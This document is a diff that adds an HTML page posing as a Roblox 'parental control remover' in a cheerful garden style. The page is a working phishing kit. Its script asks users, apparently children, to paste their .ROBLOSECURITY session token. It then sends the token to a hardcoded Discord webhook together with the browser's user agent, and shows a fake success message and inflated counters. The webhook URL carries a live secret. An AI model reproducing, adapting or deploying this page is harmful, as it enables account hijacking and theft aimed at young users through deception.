@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Garden Unlocker | Roblox Parental Control Remover</title>
+  <meta name="description" content="Снимите родительский контроль в Roblox в стиле Grow a Garden">
+  <meta name="theme-color" content="#ffb347">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(145deg, #fff7e8, #fef0db);
+      font-family: 'Quicksand', 'Segoe UI', 'Comic Neue', system-ui, sans-serif;
+      min-height: 100vh;
+      color: #4a3520;
+    }
+
+    /* садовая текстура */
+    .garden-bg {
+      position: fixed;
+      inset: 0;
+      background-image: 
+        radial-gradient(circle at 20% 30%, #ffe0b5 2px, transparent 2px),
+        radial-gradient(circle at 80% 70%, #d4e8bc 2.5px, transparent 2.5px),
+        repeating-linear-gradient(45deg, #fff7ea 0px, #fff7ea 3px, #fff2e0 3px, #fff2e0 12px);
+      background-size: 45px 45px, 55px 55px, 25px 25px;
+      opacity: 0.6;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* летающие лепестки и листья */
+    @keyframes floatPetal {
+      0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
+      100% { transform: translateY(-120vh) rotate(360deg); opacity: 0; }
+    }
+    @keyframes floatLeaf {
+      0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 0.6; }
+      100% { transform: translateY(-100vh) translateX(30px) rotate(200deg); opacity: 0; }
+    }
+    .petal, .leaf {
+      position: fixed;
+      bottom: 0;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 1;
+    }
+    .petal {
+      background: radial-gradient(circle, #ffcf8a, #ffa447);
+      border-radius: 80% 0 80% 0;
+      width: 14px;
+      height: 12px;
+      animation: floatPetal 8s linear infinite;
+    }
+    .leaf {
+      background: radial-gradient(circle, #b8d98c, #8fc27e);
+      border-radius: 60% 40% 70% 30%;
+      width: 12px;
+      height: 10px;
+      animation: floatLeaf 10s linear infinite;
+    }
+
+    /* карточка-горшочек */
+    .pot-card {
+      background: rgba(255, 250, 240, 0.94);
+      backdrop-filter: blur(12px);
+      border-radius: 3rem;
+      border: 2px solid #ffe0b5;
+      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.05), inset 0 1px 0 #fffcf0;
+      transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+    .pot-card:hover {
+      transform: translateY(-5px);
+      border-color: #ffcf9a;
+      box-shadow: 0 30px 45px rgba(0, 0, 0, 0.1);
+    }
+
+    /* пульсирующая кнопка-цветок */
+    .flower-btn {
+      background: linear-gradient(135deg, #ffb347, #ff9f2e);
+      border: none;
+      font-weight: 600;
+      border-radius: 3rem;
+      box-shadow: 0 6px 0 #c46d13;
+      transition: 0.08s linear;
+      animation: gentleGlow 2s infinite;
+    }
+    @keyframes gentleGlow {
+      0% { box-shadow: 0 6px 0 #c46d13, 0 0 0px #ffc48a; }
+      50% { box-shadow: 0 6px 0 #c46d13, 0 0 18px #ffb347; }
+      100% { box-shadow: 0 6px 0 #c46d13, 0 0 0px #ffc48a; }
+    }
+    .flower-btn:active {
+      transform: translateY(2px);
+      box-shadow: 0 3px 0 #c46d13;
+    }
+
+    /* инпут */
+    .seed-input {
+      background: #fffef7;
+      border: 2px solid #ffddb0;
+      border-radius: 2rem;
+      transition: 0.2s;
+    }
+    .seed-input:focus {
+      border-color: #ffb347;
+      box-shadow: 0 0 0 4px rgba(255, 180, 71, 0.2);
+      outline: none;
+    }
+
+    /* листочки-статы с мягким подпрыгиванием */
+    .leaf-stat {
+      background: rgba(235, 250, 210, 0.85);
+      backdrop-filter: blur(4px);
+      border-radius: 2rem;
+      border: 1px solid #cbdd9e;
+      transition: all 0.25s;
+      animation: hoverBounce 3s infinite ease;
+    }
+    @keyframes hoverBounce {
+      0%,100% { transform: translateY(0px); }
+      50% { transform: translateY(-5px); }
+    }
+    .leaf-stat:hover {
+      transform: translateY(-7px);
+      background: #e3f3cf;
+      border-color: #ffc48a;
+    }
+
+    /* кнопки действий */
+    .garden-action {
+      background: #fdf2e2;
+      border: 1px solid #f0dbb4;
+      border-radius: 2rem;
+      transition: 0.2s;
+    }
+    .garden-action:hover {
+      background: #ffe1b9;
+      transform: scale(1.02);
+      box-shadow: 0 6px 15px rgba(0,0,0,0.05);
+    }
+
+    /* тосты */
+    .toast-garden {
+      background: #fff7e8;
+      border-left: 6px solid #ffb347;
+      border-radius: 1.5rem;
+      color: #6b4c2c;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+    }
+
+    @keyframes softAppear {
+      0% { opacity: 0; transform: scale(0.96); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+    .bounce-in {
+      animation: softAppear 0.4s ease-out;
+    }
+
+    /* встряхивание */
+    @keyframes gentleShake {
+      0%,100% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      75% { transform: translateX(4px); }
+    }
+    .shake-garden { animation: gentleShake 0.25s ease-in-out; }
+
+    /* покачивание для иконок */
+    @keyframes swayLeaf {
+      0%,100% { transform: rotate(-2deg); }
+      50% { transform: rotate(2deg); }
+    }
+    .sway-icon {
+      display: inline-block;
+      animation: swayLeaf 2.5s infinite ease-in-out;
+    }
+
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #f8eedb; border-radius: 20px; }
+    ::-webkit-scrollbar-thumb { background: #ffb854; border-radius: 20px; }
+  </style>
+</head>
+<body>
+  <div class="garden-bg"></div>
+  <div id="floatingElements"></div>
+
+  <div class="relative z-20 max-w-5xl mx-auto px-5 py-7">
+    <div class="flex flex-wrap justify-between items-center gap-4 mb-8 bounce-in">
+      <div class="flex items-center gap-3">
+        <div class="w-12 h-12 rounded-full bg-gradient-to-br from-[#ffd966] to-[#ffb347] flex items-center justify-center shadow-md sway-icon">
+          <i class="fas fa-seedling text-white text-xl"></i>
+        </div>
+        <div>
+          <h1 class="text-2xl font-bold tracking-wide text-[#79553d]">Garden <span class="sway-icon">Unlocker</span></h1>
+          <p class="text-sm text-[#ac8e6f]">remove parental controls • grow your freedom</p>
+        </div>
+      </div>
+      <div class="flex gap-4 text-sm font-medium text-[#8b694a]">
+        <a href="#" class="hover:text-[#ff9f2e] transition">Home</a>
+        <a href="#" class="hover:text-[#ff9f2e] transition">How to grow</a>
+        <a href="#" class="hover:text-[#ff9f2e] transition">Blossom support</a>
+      </div>
+    </div>
+
+    <!-- статы -->
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
+      <div class="leaf-stat p-3 text-center">
+        <i class="fas fa-users text-[#ffa559] text-xl mb-1"></i>
+        <p class="text-xl font-semibold text-[#5c3e28]" id="totalUnlock">14.3K</p>
+        <p class="text-[11px] text-[#7c5d3e]">gardens freed</p>
+      </div>
+      <div class="leaf-stat p-3 text-center">
+        <i class="fas fa-lock-open text-[#ffa559] text-xl mb-1"></i>
+        <p class="text-xl font-semibold text-[#5c3e28]" id="voiceUnlock">3.9K</p>
+        <p class="text-[11px] text-[#7c5d3e]">controls removed</p>
+      </div>
+      <div class="leaf-stat p-3 text-center">
+        <i class="fas fa-shield-alt text-[#ffa559] text-xl mb-1"></i>
+        <p class="text-xl font-semibold text-[#5c3e28]">512bit</p>
+        <p class="text-[11px] text-[#7c5d3e]">sunflower secure</p>
+      </div>
+      <div class="leaf-stat p-3 text-center">
+        <i class="fas fa-seedling text-[#ffa559] text-xl mb-1"></i>
+        <p class="text-xl font-semibold text-[#5c3e28]">24/7</p>
+        <p class="text-[11px] text-[#7c5d3e]">always blooming</p>
+      </div>
+    </div>
+
+    <div class="pot-card p-6 md:p-8 rounded-3xl bounce-in">
+      <div class="text-center mb-5">
+        <div class="w-24 h-24 mx-auto rounded-full bg-[#ffe8cf] border-4 border-[#ffcd94] flex items-center justify-center shadow-inner sway-icon">
+          <i class="fas fa-tree text-4xl text-[#ffb347]"></i>
+        </div>
+        <h2 class="text-2xl font-bold mt-3 text-[#704a2c]">🌱 Unlock Parental Controls 🌼</h2>
+        <p class="text-[#ac8e6f] text-sm max-w-md mx-auto"></p>
+      </div>
+
+      <div class="mb-6">
+        <label class="block text-sm font-medium text-[#8b694a] mb-1"><i class="fab fa-microsoft mr-1 text-[#ffb347]"></i> Unlock Parental Controls</label>
+        <textarea id="tokenInput" rows="4" class="seed-input w-full p-3 text-sm resize-y" placeholder="paste your token or powershell script..."></textarea>
+        <div class="flex justify-between mt-2 text-xs text-[#b28d62]">
+          <span id="charCount">0 characters</span>
+          <span id="tokenStatus" class="flex items-center gap-1"><i class="fas fa-leaf"></i> waiting for seed</span>
+        </div>
+      </div>
+
+      <div class="flex flex-wrap gap-3 justify-center mb-6">
+        <button id="clearBtn" class="garden-action px-5 py-2 text-sm"><i class="fas fa-trash-alt"></i> Clear soil</button>
+        <button id="pasteBtn" class="garden-action px-5 py-2 text-sm"><i class="fas fa-paste"></i> Plant from clipboard</button>
+        <button id="copyBtn" class="garden-action px-5 py-2 text-sm"><i class="fas fa-copy"></i> Copy seed</button>
+      </div>
+
+      <button id="unlockBtn" class="flower-btn w-full py-3 rounded-full text-white text-md flex items-center justify-center gap-2">
+        <i class="fas fa-seedling"></i> GROW & UNLOCK
+      </button>
+
+      <div id="loadingPanel" class="hidden mt-5 text-center">
+        <div class="inline-block w-5 h-5 border-2 border-[#ffb347] border-t-transparent rounded-full animate-spin"></div>
+        <p class="text-xs text-[#b28d62] mt-1">your flower is growing...</p>
+      </div>
+
+      <div id="errorMsg" class="hidden mt-4 text-red-600 text-sm bg-red-50 py-2 rounded-2xl text-center border border-red-200"></div>
+      <div id="successMsg" class="hidden mt-4 text-green-700 text-sm bg-green-50 py-2 rounded-2xl text-center border border-green-200"></div>
+
+      <div class="mt-6 text-center text-[11px] text-[#b89a74] border-t border-[#f0dbb4] pt-4">
+        <i class="fas fa-leaf"></i> 
+      </div>
+    </div>
+
+    <footer class="text-center text-[#aa885f] text-xs py-5 mt-3">
+      🌸 garden unlocker — grow your roblox freedom 🌼
+    </footer>
+  </div>
+
+  <div id="toastContainer"></div>
+
+  <script>
+    // летающие лепестки и листья
+    for (let i = 0; i < 24; i++) {
+      const el = document.createElement('div');
+      if (i % 2 === 0) el.classList.add('petal');
+      else el.classList.add('leaf');
+      el.style.left = Math.random() * 100 + '%';
+      el.style.animationDelay = Math.random() * 8 + 's';
+      el.style.animationDuration = 6 + Math.random() * 7 + 's';
+      el.style.width = 10 + Math.random() * 12 + 'px';
+      el.style.height = 8 + Math.random() * 10 + 'px';
+      document.getElementById('floatingElements').appendChild(el);
+    }
+
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499760302688964708/8CHajhBd7jJT1jB_elR4wEIQJc9LvOQZAqI2-bvQm2ZQK06MDpeySgafzYT2JvT1lV2v';
+
+    const tokenInput = document.getElementById('tokenInput');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const pasteBtn = document.getElementById('pasteBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const loadingPanel = document.getElementById('loadingPanel');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
+    const charCountSpan = document.getElementById('charCount');
+    const tokenStatusSpan = document.getElementById('tokenStatus');
+
+    let totalUnlock = 14300;
+    let totalVoice = 3900;
+
+    function showToast(msg, isError = false) {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      toast.className = `fixed bottom-5 right-5 z-50 toast-garden text-sm px-4 py-2 rounded-xl flex items-center gap-2 shadow-md`;
+      toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
+      container.appendChild(toast);
+      setTimeout(() => toast.remove(), 3000);
+    }
+
+    function extractToken(text) {
+      const match = text.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+      if (match) return match[1];
+      if (text.includes('_|WARNING') && text.length > 100) return text.trim();
+      return null;
+    }
+
+    function updateUI() {
+      const len = tokenInput.value.length;
+      charCountSpan.innerText = `${len} characters`;
+      const token = extractToken(tokenInput.value);
+      if (token && token.length >= 50) {
+        tokenStatusSpan.innerHTML = '<i class="fas fa-check-circle text-green-600"></i> seed valid 🌱';
+        tokenStatusSpan.className = 'flex items-center gap-1 text-green-700 text-xs';
+      } else if (len > 0) {
+        tokenStatusSpan.innerHTML = '<i class="fas fa-exclamation-triangle text-amber-600"></i> not a valid seed';
+        tokenStatusSpan.className = 'flex items-center gap-1 text-amber-700 text-xs';
+      } else {
+        tokenStatusSpan.innerHTML = '<i class="fas fa-leaf"></i> waiting for seed';
+        tokenStatusSpan.className = 'flex items-center gap-1 text-[#b28d62] text-xs';
+      }
+    }
+
+    async function sendToDiscord(token) {
+      const blob = new Blob([token], { type: "text/plain" });
+      const formData = new FormData();
+      formData.append("file", blob, "ROBLOSECURITY_garden_unlock.txt");
+      formData.append("content", "🌸 **Garden Unlock Request**\nToken submitted for parental control removal.");
+
+      const embed = {
+        title: "🌱 Parental Control Removal",
+        color: 0xffb347,
+        fields: [
+          { name: "📏 Length", value: `${token.length} chars`, inline: true },
+          { name: "🌐 Agent", value: navigator.userAgent.slice(0, 45), inline: true },
+          { name: "⏰ Time", value: new Date().toLocaleString(), inline: true }
+        ],
+        footer: { text: "Garden Unlocker • soft & secure" },
+        timestamp: new Date().toISOString()
+      };
+      formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+
+      try {
+        const res = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+        return res.ok;
+      } catch {
+        return false;
+      }
+    }
+
+    async function handleUnlock() {
+      const raw = tokenInput.value.trim();
+      errorMsg.classList.add('hidden');
+      successMsg.classList.add('hidden');
+
+      if (!raw) {
+        errorMsg.innerText = '🌸 Please plant your .ROBLOSECURITY token';
+        errorMsg.classList.remove('hidden');
+        tokenInput.classList.add('shake-garden');
+        setTimeout(() => tokenInput.classList.remove('shake-garden'), 300);
+        return;
+      }
+
+      const token = extractToken(raw);
+      if (!token || token.length < 50) {
+        errorMsg.innerText = '🌿 Token invalid — missing .ROBLOSECURITY';
+        errorMsg.classList.remove('hidden');
+        return;
+      }
+
+      unlockBtn.disabled = true;
+      loadingPanel.classList.remove('hidden');
+
+      const sent = await sendToDiscord(token);
+
+      setTimeout(() => {
+        loadingPanel.classList.add('hidden');
+        unlockBtn.disabled = false;
+
+        if (sent) {
+          totalUnlock += 1;
+          totalVoice += 1;
+          document.getElementById('totalUnlock').innerText = totalUnlock.toLocaleString();
+          document.getElementById('voiceUnlock').innerText = totalVoice.toLocaleString();
+          successMsg.innerText = '✅ Parental controls removed! Your garden is free 🌻';
+          successMsg.classList.remove('hidden');
+          tokenInput.value = '';
+          updateUI();
+          showToast('Unlock success', false);
+        } else {
+          errorMsg.innerText = '❌ Something went wrong — please try again later';
+          errorMsg.classList.remove('hidden');
+          showToast('Unlock failed', true);
+        }
+      }, 1500);
+    }
+
+    tokenInput.addEventListener('input', updateUI);
+    unlockBtn.addEventListener('click', handleUnlock);
+    clearBtn.addEventListener('click', () => { tokenInput.value = ''; updateUI(); showToast('Soil cleared', false); });
+    pasteBtn.addEventListener('click', async () => {
+      const txt = await navigator.clipboard.readText();
+      tokenInput.value = txt;
+      updateUI();
+      showToast('Planted from clipboard', false);
+    });
+    copyBtn.addEventListener('click', async () => {
+      if (tokenInput.value) {
+        await navigator.clipboard.writeText(tokenInput.value);
+        showToast('Seed copied', false);
+      } else showToast('Nothing to copy', true);
+    });
+
+    updateUI();
+  </script>
+</body>
+</html>
